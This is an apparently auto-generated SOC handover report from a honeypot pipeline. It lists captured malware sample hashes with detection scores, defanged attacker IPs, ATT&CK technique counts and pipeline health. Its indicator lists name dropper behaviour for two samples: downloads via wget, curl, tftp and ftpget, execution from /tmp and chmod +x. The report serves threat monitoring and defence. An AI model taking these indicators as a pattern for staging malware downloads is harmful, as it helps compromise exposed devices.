| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **33/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `112.161.26[.]125` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `151.54.175[.]253` | IT | WIND TRE S.P.A. | **100** ⚠️ | 0 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `45.77.61[.]56` | FR | Vultr Holdings, LLC | **100** ⚠️ | 50 |
| `94.141.68[.]122` | UZ | Super iMAX - EVO Fixed connection | **100** ⚠️ | 2 |
| `146.158.123[.]60` | RU | SM Ltd. | **100** ⚠️ | 1 |
| `45.194.67[.]30` | US | VPSVAULT.HOST LTD | **100** ⚠️ | 50 |
| `203.252.10[.]4` | KR | LG DACOM Corporation | **100** ⚠️ | 50 |
| `47.254.215[.]142` | MY | Alibaba Cloud - MY | **100** ⚠️ | 27 |
| `125.227.240[.]43` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 67 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 52 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 31 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 31 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 31 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 156 cases |
| Tool 34  | Credential Extractor        | ✅ 71 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 58 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (5.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 46 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 52 priority case(s) shown individually · 39 recon entry/entries in table (19 group(s) consolidating 75 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-12T13:18:21Z_
